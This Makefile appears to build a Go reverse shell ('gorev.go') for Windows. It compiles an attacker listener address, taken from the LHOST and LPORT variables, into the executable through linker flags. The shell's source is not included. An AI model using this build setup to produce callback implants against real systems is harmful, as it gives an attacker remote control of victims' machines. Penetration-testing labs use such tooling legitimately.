
LDFLAGS=--ldflags "-X main.address=${LHOST}:${LPORT}"
all:
	env GOOS=windows GOARCH=amd64 go build ${LDFLAGS} gorev.go

clean:
	rm gorev.exe 
